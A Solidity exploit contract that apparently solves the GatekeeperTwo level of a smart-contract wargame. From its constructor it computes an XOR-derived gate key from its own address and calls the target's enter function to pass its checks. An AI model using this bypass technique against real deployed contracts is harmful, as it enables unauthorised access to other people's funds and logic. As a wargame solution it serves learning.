// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract EXP{
    GatekeeperTwo victim;

    constructor(address payable _addr) public {
        victim = GatekeeperTwo(_addr);
        uint64 _gatekey_Tmp = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1);
        bytes8 _gateKey = bytes8(_gatekey_Tmp);
        victim.enter(_gateKey);
    }
}
